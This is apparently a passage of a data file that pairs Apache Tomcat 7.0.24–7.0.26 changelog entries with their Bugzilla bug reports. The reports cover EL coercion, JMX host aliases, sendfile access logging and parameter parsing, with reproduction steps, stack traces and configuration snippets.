    classpath=/mnt/DSK2/tmp/tc/tc 7.0.23/work/Catalina/localhost/_:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tools.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-dbcp.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-jdbc.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jasper-el.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/ant.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-i18n-es.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/ant-launcher.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/annotations-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-util.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/el-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-coyote.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jasper.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jsp-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/servlet-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-i18n-ja.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina-tribes.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-i18n-fr.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina-ant.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/ecj-3.7.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina-ha.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/bin/bootstrap.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/bin/tomcat-juli.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunpkcs11.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/localedata.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunjce_provider.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/dnsns.jar
    cp=/mnt/DSK2/tmp/tc/tc 7.0.23/bin/bootstrap.jar:/mnt/DSK2/tmp/tc/tc 7.0.23/bin/tomcat-juli.jar
    cp=/mnt/DSK2/tmp/tc/tc 7.0.23/work/Catalina/localhost/_
    cp=/mnt/DSK2/tmp/tc/tc%207.0.23/lib
    cp=/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tools.jar
    cp=/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-dbcp.jar
    cp=/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-jdbc.jar
    cp=/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jasper-el.jar
[...]

### Excerpts from log file, WORK case on environment #1

17 janv. 2012 00:05:49 org.apache.jasper.compiler.JspRuntimeContext initClassPath
FIN: Compilation classpath initialized: /mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/work/Catalina/localhost/manager:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tools.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-dbcp.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-jdbc.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/jasper-el.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/ant.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-i18n-es.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/ant-launcher.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/annotations-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-util.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/el-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-coyote.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/jasper.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/jsp-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/servlet-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-i18n-ja.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/catalina.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/catalina-tribes.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-i18n-fr.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/catalina-ant.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/ecj-3.7.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/catalina-ha.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/bin/bootstrap.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/bin/tomcat-juli.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunpkcs11.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/localedata.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunjce_provider.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/dnsns.jar
[...]
17 janv. 2012 00:05:59 org.apache.jasper.compiler.AntCompiler generateClass
FIN: Using classpath: /mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/bin/bootstrap.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/bin/tomcat-juli.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/work/Catalina/localhost/_:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tools.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-dbcp.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-jdbc.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/jasper-el.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/ant.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-i18n-es.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/ant-launcher.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/annotations-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-util.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/el-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-coyote.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/jasper.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/jsp-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/servlet-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-i18n-ja.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-api.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/catalina.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/catalina-tribes.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/tomcat-i18n-fr.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/catalina-ant.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/ecj-3.7.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/lib/catalina-ha.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/bin/bootstrap.jar:/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/bin/tomcat-juli.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunpkcs11.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/localedata.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunjce_provider.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/dnsns.jar
17 janv. 2012 00:06:00 org.apache.jasper.compiler.AntCompiler generateClass
FIN: Compiled /mnt/DSK2/tmp/tc/apache-tomcat-7.0.23/work/Catalina/localhost/_/org/apache/jsp/index_jsp.java 1580ms

=*= THE END =*="|https://bz.apache.org/bugzilla/show_bug.cgi?id=52480
Jasper|Tomcat 7.0.26 (markt)|fix|52666|Correct coercion order in EL when processing the equality and inequality operators. (markt)|EL should coerce String to Integer in equals operation|"This issue was reported on the users@ list, thread:
""EL String -> int coercion stopped working after TC 5.5 -> 7.0 upgrade?""

http://tomcat.markmail.org/thread/a7l45meiakblxcvz
http://marc.info/?t=132918931400002&r=1&w=2

Original reporter used <c:out> tag, but it is not necessary to reproduce the issue.

The issue is reproducible in current 7.0 and 6.0. It works correctly in 5.5.35.

To reproduce,
1. save the following JSP page as ROOT/test.jsp
[[[
${param['foo'] == 1}<br>
${1 == param['foo']}<br>
${1 == (0+param['foo'])}<br>
]]]

2. go to http://localhost:8080/test.jsp?foo=01

Expected result:
true
true
true

Actual result:
false
false
true

This happens for foo=01, 001 etc. The equals result happens only when foo=1


According to EL 2.2 specification chapter 1.8.2 the ==,!= operators have the following step: ""If A or B is Byte, Short, Character, Integer, or Long coerce both A and B to Long, apply operator"". This step should happen earlier than coercion to String."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52666
Web applications|Tomcat 7.0.26 (markt)|update||Improve BUILDING.txt. Update instructions for building. Add instructions for using Checkstyle and running the tests. (kkolinko)|||
Web applications|Tomcat 7.0.26 (markt)|add|38216|Improve handling of null return values in the JMX proxy servlet which is part of the Manager application. (kkolinko)|Extend Jmxproxy to allow call of MBean Operations|"Currently one can only query Beans or set/get Attributes of them. It would be
good if a certain operation of a MBean could be called by the Jmxproxy Servlet."|https://bz.apache.org/bugzilla/show_bug.cgi?id=38216
Web applications|Tomcat 7.0.26 (markt)|fix|52515|Make it clear in the Realm how-to in the documentation web application that digested password storage when using DIGEST authentication requires that MD5 digests are used. (markt)|Digest auth specifically requires digested passwords to hashed with MD5|"Re:
http://tomcat.apache.org/tomcat-7.0-doc/realm-howto.html#Digested_Passwords


The documentation says:

""If using digested passwords with DIGEST authentication, the cleartext used to generate the digest is different. In the examples above {cleartext-password} must be replaced with {username}:{realm}:{cleartext-password}.""


The documentation does not mention the fact that when using HTTP Digest Auth with digested passwords, you MUST use the MD5 algorithm to digest the passwords.

When the authentication is performed, the digest algorithm specified for the realm is ignored, and MD5 is always used, so if SHA has been used, authentication will fail.


(Would it be appropriate to log a warning if it is detected that Digest Auth is being used and the Realm's digest algorithm is something other than MD5...?)

-- 
Dave"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52515
Web applications|Tomcat 7.0.26 (markt)|fix|52634|Fix typos in JSP examples. Patch provided by Felix Schumacher. (rjung)|Typos in Examples|"Created attachment 28295 [details]
Correct a typo lanaguage->language, add an 'are' and remove version number 5 from tomcat

Three minor glitches in the examples jsp's.
 * Lanaguage -> Language 
  this mistake seems to be copied in modules/jdbc-pool
 * mentioning of tomcat 5
  While this is certainly true, it is also true for 6, 7 and trunk. So removing the number seems right to me
 * add an 'are'
  Here I am not 100% sure, if are is really missing."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52634
Web applications|Tomcat 7.0.26 (markt)|fix|52641|Remove mentioning of ldap.jar from docs. Patch provided by Felix Schumacher. (rjung)|Remove mentioning of ldap.jar|"Created attachment 28302 [details]
remove mentioning of ldap.jar

I think jndi and the containing ldap driver is contained in every jre at least since jdk 1.4.x, so we don't need to advise anyone to copy ldap.jar into $CATALINA_HOME/lib."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52641
jdbc-pool|Tomcat 7.0.26 (markt)|fix||Fix code style issues and enable Checkstyle checks for jdbc-pool when it is built within Tomcat. (kkolinko)|||
jdbc-pool|Tomcat 7.0.26 (markt)|fix||51582 Correct set and reset the query cache to avoid NPE (fhanik)|NPE in SlowQueryReport|"java.lang.NullPointerException
	at java.util.concurrent.ConcurrentHashMap.get(ConcurrentHashMap.java:768)
	at org.apache.tomcat.jdbc.pool.interceptor.SlowQueryReport.getQueryStats(SlowQueryReport.java:156)
	at org.apache.tomcat.jdbc.pool.interceptor.SlowQueryReport.reportFailedQuery(SlowQueryReport.java:85)
	at org.apache.tomcat.jdbc.pool.interceptor.SlowQueryReportJmx.reportFailedQuery(SlowQueryReportJmx.java:147)
	at org.apache.tomcat.jdbc.pool.interceptor.AbstractQueryReport$StatementProxy.invoke(AbstractQueryReport.java:236)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51582
Other|Tomcat 7.0.26 (markt)|fix||Update Commons Daemon to 1.0.9 to resolve 52548 which meant that services created with service.bat did not set the catalina.home and catalina.base system properties. (markt)|service.bat fails to set catalina.base and catalina.home due to apparent procrun bug|"Created attachment 28221 [details]
diff -u patch for service.bat against 7.0.25

It appears that procrun 1.0.8 is not handling ++JvmOptions properly, instead treating it as --JvmOptions.  This results in only the last use of JvmOptions being retained in the registry, causing the settings for catalina.base and catalina.home to be lost when applied by the service.bat script.  Attached is a diff -u patch for service.bat 7.0.25 to work around the problem; it has the unfortunate effect of making the lines rather long."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52548
Other|Tomcat 7.0.26 (markt)|add||Implement check for correct end-of-line characters in the source files. It is run as separate target in build.xml. (kkolinko)|||
Web applications|Tomcat 7.0.25 (markt)|fix||Restore format of the first line of error message for JMX proxy servlet in case scripts were depending on it. (markt)|||
Other|Tomcat 7.0.25 (markt)|fix||"When building a Windows installer do not copy whole ""res"" folder to output/dist, but only the files that we need. Apply fixcrlf filter only after the files are copied, so that INSTALLLICENSE file had correct line ends. (kkolinko)"|||
Other|Tomcat 7.0.25 (markt)|update||Remove res/License.rtf. The file that is actually shown by the Windows installer is res/INSTALLLICENSE. (kkolinko)|||
Other|Tomcat 7.0.25 (markt)|add||Automate the OpenPGP signature generation for the release process. (markt)|||
Other|Tomcat 7.0.25 (markt)|fix||Don't exclude directories named target from the build process. (rjung)|||
Catalina|Tomcat 7.0.24 (markt)|add|52184|Provide greater control over the logging of errors triggered by invalid input data (i.e. data over which Tomcat has no control). (markt/kkolinko)|Reduce log level for invalid cookies|"Invalid cookies are fairly common. Firefox has them all the time. Tomcat logs fill up very quickly with this input. Tomcat doesn't log when there is an invalid HTTP request, as that would yield the same problem.co 

Nov 14, 2011 3:15:27 PM org.apache.tomcat.util.http.Cookies processCookieHeader
INFO: Cookies: Invalid cookie. Value not a token or quoted value

http://vmc-ssrc-rh56.eng.vmware.com:8080/

GET / HTTP/1.1
Host: vmc-ssrc-rh56.eng.vmware.com:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Cookie: __utma=106857756.14479066.1321292743.1321296794.1321304211.3; __utmz=106857756.1321304211.3.2.utmcsr=communities.example.com|utmccn=(referral)|utmcmd=referral|utmcct=/community/vmtn/appplatform/testapp_fire; s_nr=1321293934221; s_vi=[CS]v1|2760A9C4851D0F77-6000010260007567[CE]
Cache-Control: max-age=0"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52184
Catalina|Tomcat 7.0.24 (markt)|fix|52225|Fix ClassCastException in an Alias added to existing host through JMX. (kkolinko)|Adding Alias for existing host on running Tomcat causes ClassCastException|"There is an error in the fix for Bug 42707
(""add host alias using jmx doesn't take affect until restart"")

In Mapper#addHostAlias(String name, String alias)
the following line:
   newHost.object = realHost;

should be replaced with the following one:
   newHost.object = realHost.object;

That was r712467 (3 years ago). The issue affects current 5.5.x and 6.0.x as well.

The issue manifests itself only if addAlias() is called on an existing Host in embedded scenario or through JMX. The usual workflow of configuring aliases in server.xml is not affected.



The issue was reported on the dev@ list,
http://tomcat.markmail.org/thread/sskxor4a3xtrjmk3
""Multiple Aliases Problem""

Reproduction recipe #1, as reported on dev@:

<quote>
  I created a Host instance with the localhost1 domain name.

  Host host = new StandardHost();
  host.setAppBase(CATALINA_HOSTS_HOME);
  host.setName(""localhost1"");
  host.setDeployOnStartup(false);
  host.setBackgroundProcessorDelay(5);
  host.setAutoDeploy(false);
  host.setRealm(engine.getRealm());
  engine.addChild(host);

  Then I added the localhost2 as a alias.

  host.addAlias(""localhost2"");

  If I entered localhost1 at a browser then it works fine but if I entered localhost2 at the browser then I got an error:

Nov 21, 2011 1:29:26 PM org.apache.coyote.http11.AbstractHttp11Processor process SEVERE: Error processing request java.lang.ClassCastException:
  org.apache.tomcat.util.http.mapper.Mapper$Host
  cannot be cast to org.apache.catalina.Host
at org.apache.catalina.connector.Request.getHost(Request.java:631)
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:105) 
</quote>

A workaround for the embedded scenario should be to reorder the calls as following:
  host.addAlias(""localhost2"");
  engine.addChild(host);

That will call Mapper.addHost(String name, String[] aliases, Object host) which processes aliases correctly.


Reproduction recipe #2, using JMX:

1. In standard server.xml replace
 <Engine defaultHost=""localhost"" with <Engine defaultHost=""foohost""
 <Host name=""localhost"" with <Host name=""foohost""
2. Start Tomcat
3. Open http://localhost:8080/  It opens correctly
4. Start JConsole and connect to Tomcat
5. In Catalina -> Host -> foohost -> Operations
call addAlias(localhost)
6. Refresh http://localhost:8080/  Expected result: It opens correctly
Actual result:
- Blank page
- Exception in the logs,
[[[
22.11.2011 10:08:41 org.apache.coyote.http11.AbstractHttp11Processor process
SEVERE: Error processing request
java.lang.ClassCastException: org.apache.tomcat.util.http.mapper.Mapper$Host can
not be cast to org.apache.catalina.Host
        at org.apache.catalina.connector.Request.getHost(Request.java:623)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineVal
ve.java:77)
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52225
Catalina|Tomcat 7.0.24 (markt)|fix||Do not throw IllegalArgumentException from parseParameters() call when chunked POST request is too large, but treat it like an IO error. The FailedRequestFilter filter can be used to detect this condition. (kkolinko)|||
Catalina|Tomcat 7.0.24 (markt)|fix|52245|Don't allow web applications to package classes from the javax.el package. Patch provided by pid. (markt)|Add detection of EL Jar to WebappClassLoader|"The EL API is not currently detected by the code in WebappClassLoader.
Applications containing el-api.jar will not start.

(patch to follow)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52245
Catalina|Tomcat 7.0.24 (markt)|fix|52259|Fix regression caused by the addition of the threaded component start (46264) that triggered a deadlock on startup if no Realm was configured. (markt)|synchonization issues and dead lock if no realm is presented in configuration|"Problem:

Tomcat 7.0.23 startup freezes at ""INFO: Deploying web application directory ...""

Nuances:
- no errors are displayed in logs
- tomcat process can't be shutted down with shutdown.sh script
- http request on 80 port wait forever
- it's a multi host configuration
- the same setup works well on all previous build, including 7.0.22
- when lib/*.jar files of tomcat-7.0.23 are replaced with lib/*.jar files of tomcat-7.0.23 - everything works just fine

fix it asap!
thank you!

fill free to contact for details: a19596@mail.ru"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52259
Catalina|Tomcat 7.0.24 (markt)|fix|52293|Correctly handle the case when antiResourceLocking is enabled at the Context level when unpackWARs is disabled at the Host level. Based on a patch by Justin Miller. (markt)|antiResourceLocking and unpackWARs|"Created attachment 28034 [details]
ContextConfig.java

It appears that Tomcat is attempting to copy the WAR from the $CATALINA_HOME/webapps directory to the $CATALINA_HOME/temp directory without the .war extension (e.g., original docBase is $CATALINA_HOME/webapps/example.war and a new docBase of $CATALINA_HOME/temp/1-example ).  I think that line 973 in ContextConfig.java method antiLocking never evaluates correctly because the docBase gets set to the value of path on line 969, which removes the .war extension so the file ends up being $CATALINA_HOME/temp/1-example instead of 1-example.war.  
 
Additionally, applications with sub-context paths (e.g., foo#bar.war) never get deployed to temp correctly with antiResourceLocking=""true"" regardless of the unpackWARs setting because of the above scenario and because the docBase gets set to the context path in the antiLocking method which converts the # separator to /.  There appears to be a fix on line 882 of fixDocBase that converts the / character to # in the path but that doesn't make it to the antiLocking method.

Both 6.0.35 and 7.0.23 exhibit the same behaviour.  In 7.0.23, the docBase is changed back to the context path via the ContextName now instead of the context.getPath() but the result is the same.  Interestingly enough, there is a comment in the 7.0.23 source on line 750 that suggests the code to copy the .war file is never reached and that it's possibly a bug.  This code is never reached because the docBase is changed to the path without the .war extension."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52293
Catalina|Tomcat 7.0.24 (markt)|fix||In ExtendedAccessLogValve when printing %-encoded value of a parameter, use UTF-8 encoding to convert parameter value to bytes instead of platform default encoding. (markt/kkolinko)|||
Catalina|Tomcat 7.0.24 (markt)|fix|52303|Allow web applications that do not have a login configuration to participate in a SSO session. Patch provided by Brian Burch. (markt)|NonLoginAuthenticator does not honour session timeout with SingleSignOn Valve|"Created attachment 28052 [details]
proposed diff to fix org.apache.catalina.authenticator.NonLoginAuthenticator

This problem has been explored and discussed on the tomcat-users mailing list under the title ""SingleSignonValve and webapp session timeout"". Basically, a webapp that does not need to define a <login-config> is valid under the servlet 3.0 spec and therefore should be able to participate in a single signon realm. It should be able to inherit the security principal established by another webapp within the same realm. Its own <session-timeout> value should be honoured, even when all the other sessions in the same SingleSignOnEntry have expired.

The problem is with NonLoginAuthenticator - at some time it had SSO helper logic that was too primitive. This logic was completely commented-out in tomcat 6.0.0.

I have two fairly simple webapps (not quite drop-ins) that demonstrate the problem and my proposed fix. I have heavily commented my proposed fix to explain the surrounding dependent logic that it relies on.

At the moment I have not found an SSO-based unit test for any of the AuthenticatorBase concrete classes, but I will try to create one (eventually)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52303
Catalina|Tomcat 7.0.24 (markt)|fix|52316|When using sendfile, use the number of bytes requested to be written to the response in the access log valve for bytes written rather than recording a value of zero. (markt)|AccessLog does not log size for files sent with sendfile|"Confirming a problem reported on the users@ list.

This affects both NIO and APR protocols when file is delivered with sendfile. Note, that the file have to be >48kb to trigger use of sendfile.

Steps to reproduce:
1) Configure three connectors:
    <Connector port=""8081"" protocol=""org.apache.coyote.http11.Http11Protocol""
               connectionTimeout=""20000""
               redirectPort=""8443"" />
    <Connector port=""8082"" protocol=""org.apache.coyote.http11.Http11NioProtocol""
               connectionTimeout=""20000""
               redirectPort=""8443"" />
    <Connector port=""8083"" protocol=""org.apache.coyote.http11.Http11AprProtocol""
               connectionTimeout=""20000""
               redirectPort=""8443"" />

and configure AccessLogValve in a <Host>:

        <Valve className=""org.apache.catalina.valves.AccessLogValve""
               directory=""logs""
               prefix=""localhost_access_log."" suffix="".txt""
               pattern=""%h %l %u %t &quot;%r&quot; %s %b (%D ms)"" />

The difference from common pattern is that I added ""(%D ms)"" at the end.
 
2) Put some big file (>48k) as webapps/ROOT/file
3) Download it 3 times:
http://localhost:8081/file?8081
http://localhost:8082/file?8082
http://localhost:8083/file?8083
4) Access Log:

127.0.0.1 - - [10/Dec/2011:01:05:08 +0300] ""GET /file?8081 HTTP/1.1"" 200 15027784 (4766 ms)
127.0.0.1 - - [10/Dec/2011:01:05:23 +0300] ""GET /file?8082 HTTP/1.1"" 200 - (31 ms)
127.0.0.1 - - [10/Dec/2011:01:05:48 +0300] ""GET /file?8083 HTTP/1.1"" 200 - (16 ms)

Note that '-' is printed instead of file size for Nio and Apr connectors.

Workarounds:
------------
A). Disable sendfile with useSendfile=""false"" on a connector

B). Add the following pattern to AccessLogValve:

""%{org.apache.tomcat.sendfile.start}r %{org.apache.tomcat.sendfile.end}r""

That will log the range of bytes sent by sendfile.
E.g.:

127.0.0.1 - - [10/Dec/2011:01:05:08 +0300] ""GET /file?8081 HTTP/1.1"" 200 15027784 (4766 ms) - - 
127.0.0.1 - - [10/Dec/2011:01:05:23 +0300] ""GET /file?8082 HTTP/1.1"" 200 - (31 ms) 0 15027784 
127.0.0.1 - - [10/Dec/2011:01:05:48 +0300] ""GET /file?8083 HTTP/1.1"" 200 - (16 ms) 0 15027784 
--------------

Overall, looking at the timing value printed by %D I would say that logging occurs before data are sent. So the value of 0 bytes is correct.

It could be possible to log file size from request attributes set by sendfile, but that cannot account for aborted downloads. Though I think that would be better than the current logging of '0'.

At least this limitation can be mentioned in documentation for %b and %B patterns in AccessLogValve section in valve.html and in Javadoc."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52316
Catalina|Tomcat 7.0.24 (markt)|fix|52326|Reduce log level for class loading errors during @HandlesTypes processing to debug. (markt)|Lower log level for failed class loading|"Reference: https://jira.springsource.org/browse/SPR-8894

Tomcat attempts to load classes when it searches for annotations. These class loading attempts when failed, should be silently ignored. 

If the application attempts to load the classes later, it will receive the actual error. However, when Tomcat prints out the stack trace of this class loading error, it gives the wrong signal. There is actually not anything wrong in the application itself, so a WARN as tomcat logs with a stack trace becomes misleading.

The initial fix would be: ContextConfig.java to drop log level to debug in checkHandleTypes method
       Class<?> clazz = null;
        try {
            clazz = context.getLoader().getClassLoader().loadClass(className);
        } catch (NoClassDefFoundError e) {
            log.debug(sm.getString(""contextConfig.invalidSciHandlesTypes"",
                    className), e);
            return;
        } catch (ClassNotFoundException e) {
            log.warn(sm.getString(""contextConfig.invalidSciHandlesTypes"",
                    className), e);
            return;
        } catch (ClassFormatError e) {
            log.warn(sm.getString(""contextConfig.invalidSciHandlesTypes"",
                    className), e);
            return;
        } catch (Throwable t) {
            ExceptionUtils.handleThrowable(t);
            log.warn(sm.getString(""contextConfig.invalidSciHandlesTypes"",
                    className), t);
            return;
        }

The better fix would be to achieve the same without classloading at all.
Other containers do ignore any type of classloading errors during this sequence."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52326
Catalina|Tomcat 7.0.24 (markt)|fix|52328|Improve performance when large numbers of single characters and/or small strings are written to the response via a Writer. (markt)|Massive garbage production observed when using the response writer|"In our application we used to use Tomcat 5, by writing our content directly to the response writer in our servlet:

Writer w = response.getWriter();
w.append(...)


We have regularly measured performance of our application under stress with multiple simultaneous requests per second.

We recently upgraded to Tomcat 7, and immediately observed a performance degradation of 10% on the request roundtrip on the same machine and the same tests, compared to our application deployed on Tomcat 5.

Profiling with JProfiler showed that we got massive amount of transient objects {{java.nio.HeapCharBuffer}} produced - 400Mb+ within a few minutes.

The way we are writing the response is by multiple statements of {{append}} of small strings or single chars, which used to work properly. For experiment, we wrapped the response writer with a {{BufferedWriter}} with a buffer of 64k. This brought our application's performance back to normal.

We see this as either a:
- anti-pattern usage since Tomcat 6/7, in which case please provide some documentation about that.
- bug in the C2BConverter that is applied per every call to the CoyoteWriter write methods, which generates the garbage buffers per every call.

We know that the response stream has a 8k buffer by default. Nevertheless, this buffer comes after the encoding step and as such it is too late to help with the garbage. Perhaps Tomcat can buffer before it encodes?

Still, so much transient objects for just a pattern of eligible use of the servlet API seems a bug to me."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52328
Catalina|Tomcat 7.0.24 (markt)|fix|52384|Do not fail with parameter parsing when debug logging is enabled. (kkolinko)|URL parameter without value should be parsed successfully when logging level = DEBUG|"Create a simple servlet with 

protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    request.getParameterMap();
}

Start Tomcat under Eclipse, or force logging level for class org.apache.tomcat.util.http.Parameters to be ""DEBUG""
Call the servlet with parameter which has no value set, e.g.

http://localhost:8080/mywebapp/myservlet?parameterWithotValue

(so only the ""parameterWithotValue"" should be in the result of request.getParameterMap())

enjoy exception:

java.lang.ArrayIndexOutOfBoundsException
	at java.lang.System.arraycopy(Native Method)
	at org.apache.tomcat.util.buf.ByteChunk.append(ByteChunk.java:334)
	at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:347)
	at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:425)
	at org.apache.tomcat.util.http.Parameters.handleQueryParameters(Parameters.java:189)
	at org.apache.catalina.connector.Request.parseParameters(Request.java:2993)
	at org.apache.catalina.connector.Request.getParameterNames(Request.java:1185)
	at org.apache.catalina.connector.Request.getParameterMap(Request.java:1164)
	at org.apache.catalina.connector.RequestFacade.getParameterMap(RequestFacade.java:444)
	at ru.agapemoda.servlet.ImageServlet.doGet(ImageServlet.java:47)
             ......................................................
	at java.lang.Thread.run(Thread.java:662)

Note: when logging level is ""SEVERE"", the troublesome code in org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:347) 

            if (log.isDebugEnabled()) {
                try {
                    origName.append(bytes, nameStart, nameEnd - nameStart);
                    origValue.append(bytes, valueStart, valueEnd - valueStart);
                } catch (IOException ioe) {
                    // Should never happen...
                    log.error(sm.getString(""parameters.copyFail""), ioe);
                }
            }

is not executed and parameter is being parsed successfully. Should be parsed successfully with log level = ""DEBUG"" as well."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52384
Catalina|Tomcat 7.0.24 (markt)|fix||Do not flag extra '&' characters in parameters as parse errors. (kkolinko)|||
Catalina|Tomcat 7.0.24 (markt)|fix||Reduce log level for the message about hitting maxParameterCount limit from WARN to INFO. (kkolinko)|||
